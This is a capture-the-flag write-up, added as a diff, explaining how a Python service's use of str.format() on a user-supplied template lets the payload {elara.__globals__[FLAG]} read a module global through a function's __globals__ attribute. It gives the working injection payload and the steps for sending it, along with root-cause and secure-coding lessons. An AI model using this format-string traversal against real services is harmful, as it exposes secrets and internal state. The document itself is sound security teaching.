@@ -1,0 +1,322 @@
+# Read Me My Fortune — Write-up
+
+## Challenge Information
+
+* **Challenge:** Read Me My Fortune
+* **Category:** Exploit / Python
+* **Difficulty:** Medium
+* **Vulnerability:** Python `str.format()` attribute traversal
+* **Target:** Recover the dynamically generated flag
+
+---
+
+## 1. Initial Analysis
+
+The challenge provides the source code for a Python service called `service.py`.
+
+The important part of the application is the personalized reading:
+
+```python
+template = _read("  Template: ", max_len=2048)
+
+date = datetime.datetime.utcnow().strftime("%B %d, %Y")
+
+reading = template.format(
+    name=name, sign=sign, date=date, elara=_greet,
+)
+```
+
+The user controls the entire `template` string.
+
+The application claims that only these placeholders are available:
+
+```text
+{name}
+{sign}
+{date}
+{elara}
+```
+
+However, Python's `str.format()` does more than simple variable substitution. It also allows attribute and item access.
+
+That makes `{elara}` particularly interesting.
+
+---
+
+## 2. Finding the Interesting Object
+
+The application passes the `_greet` function as the `elara` formatting argument:
+
+```python
+elara=_greet
+```
+
+The function is defined as:
+
+```python
+def _greet():
+    return "Welcome, seeker. The candles are lit; the tea is steeping."
+```
+
+Python function objects have a special attribute called:
+
+```text
+__globals__
+```
+
+This contains the global namespace belonging to the module in which the function was defined.
+
+Therefore:
+
+```text
+elara.__globals__
+```
+
+gives access to the global variables of `service.py`.
+
+---
+
+## 3. Finding the Flag
+
+Earlier in the source we can see:
+
+```python
+FLAG = None
+```
+
+and later:
+
+```python
+if DEV_MODE:
+    FLAG = "POCTF{dev.flag.local.testing.only}"
+```
+
+In production, the service instead calculates the flag:
+
+```python
+team_id, cid, nonce = result
+FLAG = _build_marker(cid, team_id, nonce)
+```
+
+Therefore, regardless of how the flag was generated, the final value is stored in the module-level variable:
+
+```python
+FLAG
+```
+
+Since `FLAG` exists inside the module's global namespace, we can retrieve it through:
+
+```text
+elara.__globals__[FLAG]
+```
+
+---
+
+## 4. Exploitation
+
+The final format-string payload is:
+
+```text
+{elara.__globals__[FLAG]}
+```
+
+The format engine processes it approximately like this:
+
+```text
+elara
+  ↓
+_greet function
+  ↓
+__globals__
+  ↓
+FLAG
+  ↓
+flag value
+```
+
+So instead of simply printing the greeting function, we use the function as a starting point to traverse into the module's global namespace.
+
+---
+
+## 5. Remote Exploitation
+
+First, the service requires a valid session token.
+
+The source shows:
+
+```python
+tok = _read("  Token: ", max_len=512)
+result = _verify_token(tok, CHALLENGE_ID_ENV)
+```
+
+A valid token is supplied by the challenge website.
+
+After entering the token, the service asks for:
+
+```text
+What is your name?
+What is your star sign?
+Template:
+```
+
+The name and star sign are irrelevant to the exploit.
+
+For example:
+
+```text
+What is your name? test
+What is your star sign? test
+```
+
+Then provide:
+
+```text
+Template: {elara.__globals__[FLAG]}
+```
+
+The service evaluates:
+
+```python
+template.format(
+    name=name,
+    sign=sign,
+    date=date,
+    elara=_greet,
+)
+```
+
+and the format string retrieves the value of `FLAG`.
+
+---
+
+## 6. Why the Token Does Not Need to Be Forged
+
+At first glance, the HMAC implementation may look like the main target:
+
+```python
+mac = hmac.new(
+    secret.encode("utf-8"),
+    payload.encode("utf-8"),
+    hashlib.sha256
+)
+```
+
+However, there is no need to recover or forge the secret.
+
+The server itself performs all of the following:
+
+1. Verifies the player's legitimate session token.
+2. Extracts `team_id`, `cid`, and `nonce`.
+3. Generates the team/session-specific flag.
+4. Stores the result in the global variable `FLAG`.
+5. Passes `_greet` to the attacker-controlled format string.
+
+The vulnerability is therefore an **information disclosure primitive after authentication**, rather than an authentication bypass.
+
+---
+
+## 7. Root Cause
+
+The vulnerable code is:
+
+```python
+reading = template.format(
+    name=name,
+    sign=sign,
+    date=date,
+    elara=_greet,
+)
+```
+
+The application treats user-controlled input as a format string.
+
+This is dangerous because Python's format-string syntax permits object traversal.
+
+The developer intended users to access only:
+
+```text
+{name}
+{sign}
+{date}
+{elara}
+```
+
+but did not restrict what could be accessed from those objects.
+
+Because `elara` is a function, it provides a path to:
+
+```text
+__globals__
+```
+
+which exposes the module's global namespace.
+
+---
+
+## 8. Exploit Chain
+
+The complete exploit chain is:
+
+```text
+User-controlled template
+        ↓
+      {elara}
+        ↓
+     _greet()
+        ↓
+  __globals__
+        ↓
+      FLAG
+        ↓
+   Session flag
+```
+
+The crucial payload is:
+
+```text
+{elara.__globals__[FLAG]}
+```
+
+---
+
+## 9. Lessons Learned
+
+### 1. Never use unrestricted user input as a format string
+
+Instead of:
+
+```python
+template.format(...)
+```
+
+with an attacker-controlled template, applications should use a safe templating system or strictly restrict the permitted placeholders.
+
+### 2. Functions expose useful metadata
+
+Python objects contain attributes that can reveal much more than their intended application-level functionality.
+
+In this case:
+
+```python
+_greet.__globals__
+```
+
+exposed the module's global namespace.
+
+### 3. Authentication does not eliminate exploitation
+
+The challenge intentionally requires a legitimate session token. The vulnerability occurs after authentication.
+
+A valid user's privileges should still be restricted so that they cannot access unintended application internals.
+
+---
+
+## 10. Final Payload
+
+```text
+{elara.__globals__[FLAG]}
+```
+
+This reads the dynamically generated `FLAG` from the Python module's global namespace through the `_greet` function supplied as the `elara` format argument.
+
+**Flag:** Obtained by submitting the payload to the remote service with a valid session token.
